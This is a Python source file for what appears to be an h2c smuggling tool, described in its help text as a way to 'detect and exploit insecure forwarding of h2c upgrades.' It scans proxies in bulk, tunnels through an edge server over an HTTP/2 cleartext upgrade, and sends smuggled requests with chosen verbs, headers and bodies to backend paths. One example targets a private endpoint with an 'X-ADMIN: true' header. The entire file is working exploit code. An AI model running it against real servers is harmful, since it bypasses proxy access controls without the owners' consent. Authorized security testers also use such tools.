#!/usr/bin/env python3
import h2.connection
from h2.events import (
    ResponseReceived, DataReceived, StreamReset, StreamEnded
)

import argparse
import multiprocessing.dummy as mp
import socket
import ssl
import sys
from urllib.parse import urlparse, urljoin

MAX_TIMEOUT = 10
UPGRADE_ONLY = False


def handle_events(events, isVerbose):
    for event in events:
        if isinstance(event, ResponseReceived):
            handle_response(event.headers, event.stream_id)
        elif isinstance(event, DataReceived):
            print(event.data.decode('utf-8', 'replace'))
            print("")
        elif isinstance(event, StreamReset):
            raise RuntimeError("stream reset: %d" % event.error_code)
        else:
            if isVerbose:
                print("[INFO] " + str(event))


def handle_response(response_headers, stream_id):
    for name, value in response_headers:
        print("%s: %s" % (name.decode('utf-8'), value.decode('utf-8')))

    print("")


def establish_tcp_connection(proxy_url):
    global MAX_TIMEOUT

    port = proxy_url.port or (80 if proxy_url.scheme == "http" else 443)
    connect_args = (proxy_url.hostname, int(port))

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    retSock = sock
    if proxy_url.scheme == "https":
        retSock = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLS)

    retSock.settimeout(MAX_TIMEOUT)
    retSock.connect(connect_args)

    return retSock


def send_initial_request(connection, proxy_url, settings):
    global UPGRADE_ONLY
    path = proxy_url.path or "/"

    addl_conn_str = b", HTTP2-Settings"
    if UPGRADE_ONLY:
        addl_conn_str = b""

    request = (
        b"GET " + path.encode('utf-8') + b" HTTP/1.1\r\n" +
        b"Host: " + proxy_url.hostname.encode('utf-8') + b"\r\n" +
        b"Accept: */*\r\n" +
        b"Accept-Language: en\r\n" +
        b"Upgrade: h2c\r\n" +
        # b"HTTP2-Settings: " + settings + b"\r\n" +
        #
        # hyper-h2 base64-encoded settings contain '_' chars, which although
        # allowed by spec triggered errors on some faulty h2c implementatons.
        b"HTTP2-Settings: " + b"AAMAAABkAARAAAAAAAIAAAAA" + b"\r\n" +
        b"Connection: Upgrade" + addl_conn_str + b"\r\n" +
        b"\r\n"
    )
    connection.sendall(request)


def get_upgrade_response(connection, proxy_url):
    data = b''
    while b'\r\n\r\n' not in data:
        data += connection.recv(8192)

    headers, rest = data.split(b'\r\n\r\n', 1)

    # An upgrade response begins HTTP/1.1 101 Switching Protocols.
    split_headers = headers.split()
    if split_headers[1] != b'101':
        print("[INFO] Failed to upgrade: " + proxy_url.geturl())
        return None, False

    return rest, True


def getData(h2_connection, sock):
    events = []
    try:
        while True:
            newdata = sock.recv(8192)
            events += h2_connection.receive_data(newdata)
            if len(events) > 0 and isinstance(events[-1], StreamEnded):
                raise socket.timeout()
    except socket.timeout:
        pass

    return events


def sendData(h2_connection, connection, data, stream_id):
    """
    From: https://github.com/python-hyper/hyper-h2/blob/master/examples/twisted/post_request.py
    """
    # Firstly, check what the flow control window is for stream 1.
    window_size = h2_connection.local_flow_control_window(stream_id=stream_id)

    # Next, check what the maximum frame size is.
    max_frame_size = h2_connection.max_outbound_frame_size

    file_size = len(data)
    # We will send no more than the window size or the remaining file size
    # of data in this call, whichever is smaller.
    bytes_to_send = min(window_size, file_size)

    # We now need to send a number of data frames.
    idx = 0
    while bytes_to_send > 0:
        chunk_size = min(bytes_to_send, max_frame_size)
        data_chunk = data[idx:(idx + chunk_size)]
        h2_connection.send_data(stream_id=stream_id, data=data_chunk)

        idx += chunk_size
        bytes_to_send -= chunk_size
        file_size -= chunk_size

    # We've prepared a whole chunk of data to send. If the file is fully
    # sent, we also want to end the stream: we're done here.
    if file_size == 0:
        h2_connection.end_stream(stream_id=stream_id)
    else:
        # We've still got data left to send but the window is closed. Save
        # a Deferred that will call us when the window gets opened.
        print("[ERROR] Window closed. Incomplete data transmission.",
              file=sys.stderr)

    connection.write(h2_connection.data_to_send())


def sendSmuggledRequest(h2_connection, connection,
                        smuggled_request_headers, args):

    stream_id = h2_connection.get_next_available_stream_id()

    # Custom Step 2: Send new request on new stream id
    h2_connection.send_headers(stream_id,
                               smuggled_request_headers,
                               end_stream=args.data is None)
    # Custom Step 3: Immediately send the pending HTTP/2 data.
    connection.sendall(h2_connection.data_to_send())

    if args.data:
        sendData(h2_connection,
                 connection,
                 args.data.encode("UTF-8"),
                 stream_id)

    # Custom Step 4: Receive data and process
    events = getData(h2_connection, connection)
    handle_events(events, args.verbose)


def main(args):
    """
    The client upgrade flow.
    """
    if not args.proxy.startswith("http"):
        print("[ERROR]: invalid protocol: " + args.proxy, file=sys.stderr)
        sys.exit(1)

    proxy_url = urlparse(args.proxy)

    # Step 1: Establish the TCP connecton.
    connection = establish_tcp_connection(proxy_url)

    # Step 2: Create H2 Connection object, put it in upgrade mode, and get the
    # value of the HTTP2-Settings header we want to use.
    h2_connection = h2.connection.H2Connection()
    settings_header_value = h2_connection.initiate_upgrade_connection()

    # Step 3: Send the initial HTTP/1.1 request with the upgrade fields.
    send_initial_request(connection, proxy_url, settings_header_value)

    # Step 4: Read the HTTP/1.1 response, look for 101 response.
    extra_data, success = get_upgrade_response(connection, proxy_url)

    if not success:
        sys.exit(1)

    print("[INFO] h2c stream established successfully.")
    if args.test:
        print("[INFO] Success! " + args.proxy + " can be used for tunneling")
        sys.exit(0)

    # Step 5: Immediately send the pending HTTP/2 data.
    connection.sendall(h2_connection.data_to_send())

    # Step 6: Feed the body data to the connection.
    events = h2_connection.receive_data(extra_data)

    # Step 7 Receive data and process
    events = getData(h2_connection, connection)

    connection.sendall(h2_connection.data_to_send())

    handle_events(events, args.verbose)

    # Craft request headers and grab next available stream id
    if args.wordlist:
        with open(args.wordlist) as fd:
            urls = [urlparse(urljoin(args.url, url.strip()))
                    for url in fd.readlines()]
    else:
        urls = [urlparse(args.url)]

    for url in urls:
        path = url.path or "/"
        query = url.query

        if query:
            path = path + "?" + query

        smuggled_request_headers = [
            (':method', args.request),
            (':authority', url.hostname),
            (':scheme', url.scheme),
            (':path', path),
        ]

        # Add user-defined headers
        if args.header:
            for header in args.header:
                smuggled_request_headers.append(tuple(header.split(": ")))

        # Send request
        print("[INFO] Requesting - " + path)
        sendSmuggledRequest(h2_connection,
                            connection,
                            smuggled_request_headers,
                            args)

    # Terminate connection
    h2_connection.close_connection()
    connection.sendall(h2_connection.data_to_send())
    connection.shutdown(socket.SHUT_RDWR)
    connection.close()


def scan(line):
    connection = None
    try:
        proxy_url = urlparse(line)
        if not line.startswith("http"):
            print("[ERROR]: skipping invalid protocol: " + line)
            return

        connection = establish_tcp_connection(proxy_url)

        h2_connection = h2.connection.H2Connection()
        settings_header_value = h2_connection.initiate_upgrade_connection()

        send_initial_request(connection, proxy_url,
                             settings_header_value)
        _, success = get_upgrade_response(connection, proxy_url)
        if not success:
            return

        print("[INFO] Success! " + line + " can be used for tunneling")
        sys.stdout.flush()
    except Exception as e:
        print("[ERROR] " + e.__str__() + ": " + line, file=sys.stderr)
        sys.stderr.flush()
    finally:
        if connection:
            connection.shutdown(socket.SHUT_RDWR)
            connection.close()


def init():
    global MAX_TIMEOUT, UPGRADE_ONLY

    if sys.version_info < (3, 0):
        sys.stdout.write("Sorry, requires Python 3.x, not Python 2.x\n")
        sys.exit(1)

    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="Detect and exploit insecure forwarding of h2c upgrades.",
        epilog="Example Usage:\n"
               + sys.argv[0] + " --scan-list urls.txt --threads 5\n"
               + sys.argv[0] + " -x https://edgeserver http://localhost\n"
               + sys.argv[0] + " -x https://edgeserver -XPOST -d "
               "'{\"data\":1}' -H \"Content-Type: application/json\""
               "-H \"X-ADMIN: true\" http://backend/private/endpoint"
    )
    parser.add_argument("--scan-list",
                        help="list of URLs for scanning")
    parser.add_argument("--threads",
                        type=int,
                        default=5,
                        help="# of threads (for use with --scan-list)")
    parser.add_argument("--upgrade-only",
                        default=False,
                        action="store_true",
                        help="drop HTTP2-Settings from outgoing "
                             "Connection header")
    parser.add_argument("-x", "--proxy",
                        help="proxy server to try to bypass")
    parser.add_argument("-i", "--wordlist",
                        help="list of paths to bruteforce")
    parser.add_argument("-X", "--request",
                        default="GET",
                        help="smuggled verb")
    parser.add_argument("-d", "--data",
                        help="smuggled data")
    parser.add_argument("-H", "--header",
                        action="append",
                        help="smuggled headers")
    parser.add_argument("-m", "--max-time",
                        type=float,
                        default=10,
                        help="socket timeout in seconds "
                             "(type: float; default 10)")
    parser.add_argument("-t", "--test",
                        help="test a single proxy server",
                        action="store_true")
    parser.add_argument("-v", "--verbose",
                        action="store_true")
    parser.add_argument("url", nargs="?")
    args = parser.parse_args()

    MAX_TIMEOUT = args.max_time
    UPGRADE_ONLY = args.upgrade_only

    if args.scan_list:
        lines = []
        with open(args.scan_list) as fd:
            lines = [line.strip() for line in fd.readlines()]

        p = mp.Pool(args.threads)
        p.map(scan, lines)
        p.close()
        p.join()
        sys.exit(1)

    if not args.proxy:
        print("Please provide a server for tunneling ('-x') flag ",
              file=sys.stderr)
        sys.exit(1)

    if not args.test and not args.url:
        print("Please specify the '-t' flag or provide smuggled URL")
        sys.exit(1)

    if args.url and not urlparse(args.url).scheme:
        print("Please specify scheme (e.g., http[s]://) for: " + args.url)
        sys.exit(1)

    if not urlparse(args.proxy).scheme:
        print("Please specify scheme (e.g., http[s]://) for: " + args.proxy)
        sys.exit(1)

    main(args)


if __name__ == "__main__":
    init()
